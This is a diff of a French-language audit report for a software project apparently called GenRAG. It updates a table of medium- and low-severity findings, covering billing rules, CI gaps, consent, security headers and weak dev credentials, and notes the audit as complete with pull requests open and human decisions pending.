+| 10 | B-21 | Moyenne | Le playground vérifie et **débite** les crédits (`skipUsageTracking` non positionné), alors que la doc indi… | le code et la doc se contredisent : faut-il facturer le playground ? règle de facturation |
+| 11 | B-24 | Moyenne | Index manquants sur des colonnes filtrées/triées : `Conversation(agentId, userId, updatedAt)`, `Conversatio… | migration |
+| 12 | B-29 | Moyenne (reste) | 5 tests e2e échouent (baseline) : réponse `204` attendue `200` sur `DELETE agent` (le controller a `@HttpCo… | trim du nom d'agent : le test l'attend, le code ne le fait pas — lequel a raison ? |
+| 13 | B-33 | Moyenne | `node:23-alpine` (version non LTS, fin de vie), `yarn install` non figé, devDependencies dans l'image, exéc… | infra |
+| 14 | B-34 | Moyenne | Chaque workspace créé reçoit 180 crédits (plan FREE) + 20 à l'onboarding, sans limite de création. | métier |
+| 15 | B-35 | Moyenne | Suppression d'utilisateur / workspace / agent : cascade DB, mais fichiers S3 et vecteurs du moteur RAG jama… | suppression irréversible de données S3 et du moteur RAG, nouvel appel inter-services |
+| 16 | B-36 | Moyenne | Si le client se déconnecte en cours de flux, le flux RAG est détruit (`destroy()` sans erreur) : ni `end` n… | règle de facturation |
+| 17 | B-41 | Moyenne | CI back : pas de Redis, pas de variables `AWS_*`/`RESEND_*`/`S3_BUCKET` (lues par `getOrThrow` au démarrage… | CI/secrets |
+| 18 | F-08 | Moyenne | Les documents Word sont prévisualisés via `view.officeapps.live.com` en lui passant l'URL présignée S3. | fonctionnalité |
+| 19 | F-10 | Moyenne | Mixpanel activé d'office (`opt_in_tracking()`) sans consentement, avec `people.set({ $name, $email })`. | légal |
+| 20 | F-11 | Moyenne | Écrans simulés en production : achat de crédits factice (`setTimeout`, « Visa •• 4242 »), fausse clé API `s… | produit |
+| 21 | F-18 | Moyenne | Outillage de dev dans `dependencies` (eslint, prettier, typescript, @types/*, testing-library) ; `motion` e… | dépendances |
+| 22 | R-02 | Moyenne | Lint front non bloquant (`continue-on-error`), pas de typecheck/build de `packages/workflow` ni de `vitrine… | CI/secrets |
+| 23 | V-02 | Moyenne | TODO ouverts : liens légaux (mentions légales, confidentialité) et email de contact absents, section sécuri… | contenu juridique |
+| 24 | V-03 | Moyenne | Le formulaire collecte email/entreprise/fonction sans mention d'information (finalité, durée, droits). | texte juridique |
+| 25 | W-01 | Moyenne | Un node MODEL resté placeholder (`isPlaceholder: true`, `modelName` indéfini) n'est pas ignoré : `serialize… | contrat avec le moteur RAG |
+| 26 | W-06 | Moyenne | Aucun test, alors que `serializeWorkflow` et `sanitizeWorkflowEdges` définissent le contrat avec le moteur… | outillage de test à introduire |
+| 27 | B-22 | Basse | La purge planifiée supprime des `Conversation`, la doc parle de `AgentQueryLog`. | règle de rétention des données : purger les conversations ou les logs ? corriger le code ou la doc |
+| 28 | B-23 | Basse | La doc indique « un workspace démarre à 0 crédit (`POST /workspaces/:id/credit-balance`) » : le plan FREE o… | doc de référence |
+| 29 | B-25 | Basse | Listes non paginées : exports (toutes conversations + messages en mémoire), conversations d'un assistant, `… | contrat d'API |
+| 30 | B-26 | Basse | `/docs` (référence API Scalar) exposé publiquement en production. | choix produit : la référence d'API doit-elle rester publique ? |
+| 31 | B-27 | Basse | Aucun en-tête de sécurité HTTP (`helmet`). | nouvelle dépendance |
+| 32 | B-28 | Basse | Chaînes sans `@MaxLength`/`@IsNotEmpty` (nom d'agent, de workspace, changelog, query de `compare`…), `defin… | peut refuser des entrées aujourd'hui acceptées |
+| 33 | B-30 | Basse | Logique métier et accès Prisma directement dans un controller (contraire à la règle Controller → Service →… | refactor au-delà d'une correction ciblée, cf. plan en fin de rapport |
+| 34 | B-37 | Basse | `executeQuery` (onboarding `compare`) enregistre l'usage directement dans le chemin de la requête, contrair… | touche le calcul des crédits et 2 modules |
+| 35 | B-39 | Basse | Deux endpoints de logs de requêtes (`…/runtime/query-logs` et `…/analytics/query-logs`) et deux jeux d'inte… | API publique |
+| 36 | B-40 | Basse | Toutes les règles ESLint sont rétrogradées en `warn` : `yarn lint` ne peut jamais échouer. | CI |
+| 37 | B-42 | Basse | Verrouillage par email uniquement (5 échecs / 15 min). | politique de sécurité : un verrouillage par IP peut bloquer des utilisateurs légitimes derrière un NAT |
+| 38 | B-43 | Basse | Énumération de comptes : `409` à l'inscription, message explicite « aucun compte GenRAG n'existe avec l'ema… | UX |
+| 39 | B-44 | Basse | Les OTP sont hachés en HMAC avec `JWT_SECRET` (réutilisation de clé). | secret |
+| 40 | B-45 | Basse | Toutes les routes d'onboarding sont accessibles à un VIEWER : `start` crée un agent, `complete` réécrit le… | un VIEWER invité voit-il l'onboarding ? |
+| 41 | B-46 | Basse | `timeout` axios de 120 s ne couvre que l'attente des en-têtes : un flux qui cesse d'émettre reste ouvert in… | valeur métier |
+| 42 | B-47 | Basse | Mélange fuseau serveur (`getHours`, `setHours(0)`) et UTC (`toISOString`, `DATE_TRUNC` côté DB). | choix du fuseau de référence : modifie les statistiques affichées |
+| 43 | B-48 | Basse | Pas de test pour `WorkspaceRolesGuard`, `AgentBelongsToWorkspaceGuard`, `DocumentService`, `RagEngineServic… | couverture |
+| 44 | F-07 | Basse | `executeAgentRuntime` (`POST …/runtime`) et l'URL par défaut `…/runtime/stream` n'existent pas côté back ;… | API du hook |
+| 45 | F-09 | Basse | Iframes de prévisualisation sans `sandbox` sur des fichiers déposés par les utilisateurs (dont `text/html`, cf | liée à B-15 |
+| 46 | F-12 | Basse | Route de dev publique `/test` (écran de bienvenue sans `onDone`). | usage éventuel en démo |
+| 47 | F-13 | Basse | Recherche et filtre par type appliqués à la seule page chargée (8 documents). | API |
+| 48 | F-14 | Basse | Une URL présignée demandée par carte PDF en vue grille. | nécessite un chargement paresseux ou un endpoint de vignettes : UX/API |
+| 49 | F-15 | Basse | Polling par `fetch()` direct (hors RTK Query, cf | flux d'upload à retester manuellement |
+| 50 | F-16 | Basse | Types divergents du back : `User.isEmailVerified` et `CurrentDeployment.activeWorkflow.{version,name}` ne s… | contrat front/back : le badge « vérifié » du profil, `PersonalInfoSection.tsx:92`, n'est jamais affiché ; l'exposer côté back change la réponse de `/users/me`, le retirer côté front supprime le badge |
+| 51 | F-19 | Basse | Librairie de charts vendue (shadcn/bklit) dont une grande partie n'est pas utilisée (16 fichiers de l'app l… | code tiers |
+| 52 | F-20 | Basse (reste) | README = boilerplate CRA ; `ARCHITECTURE.md` décrit des routes supprimées (`/workspaces`, `/organisation`). | `ARCHITECTURE.md` : réécrire ou supprimer ce document de référence |
+| 53 | F-21 | Basse | Écran de chargement artificiel de 800 ms à chaque ouverture de l'app. | choix UX |
+| 54 | F-22 | Basse | Hook RTK choisi conditionnellement (`cond ? useGetModelsRerankQuery : useGetModelsGenerationQuery`) puis ap… | refactor |
+| 55 | F-23 | Basse | La doc indique que l'app consomme `packages/workflow/dist` ; craco aliasse en fait `@genrag/workflow` vers… | doc de référence |
+| 56 | R-01 | Basse (reste) | `.gitignore` ignore `package-lock.json` (workspace yarn), mais deux lockfiles npm périmés restent suivis da… | suppression des `package-lock.json` suivis (lockfiles) |
+| 57 | R-03 | Basse | Postgres (`admin/password`), pgAdmin (`admin/admin`) et Redis (sans mot de passe) publiés sur toutes les in… | infra |
+| 58 | R-04 | Basse | `start.sh` lance le front en arrière-plan sans jamais le tuer (`FRONT_PID` inutilisé) ; `dev.sh e2e` attend… | scripts d'infra |
+| 59 | R-05 | Basse | La doc racine annonce `POST /rag/index (multipart file + document_id)` ; le back appelle en réalité `POST /… | doc de référence |
+| 60 | V-04 | Basse | Ancien site Next.js conservé dans le dépôt (exclu du build/lint). | choix de conserver ou non l'historique de l'ancien site |
+| 61 | W-05 | Basse | Peer `lucide-react ^0.500.0` (≡ `>=0.500 <0.501` en 0.x) incompatible avec la version de l'app (0.542) → av… | dépendances / lockfiles |
+| 62 | W-07 | Basse | Listes de modèles statiques (`LLMS`, `ReRanker`) divergentes des modèles réels servis par l'API ; composant… | refactor UI |
 
 ## Prochaine action
 
-Phase 3 : PR suivante — `audit/back-csv-export-injection` (B-10), puis B-11 (normalisation email), F-01 (Markdown IA), F-02…F-06, B-29, puis les Basses et les refactors (Template Method sur les sinks, service d'export).
+Audit terminé : tous les fichiers sont cochés, chaque constat est soit en PR ouverte, soit en décision humaine justifiée, et la PR de clôture (Phase 4) est ouverte. Suite côté équipe : relire et fusionner les PR #58 → #83 (ordre conseillé : Critique/Haute d'abord, #66 avant le refactor B-30), renseigner `GOOGLE_CLIENT_ID` avant de déployer #59, puis arbitrer les décisions humaines ci-dessus en commençant par B-04.
 
 ## Fichiers à auditer (Phase 2)
 
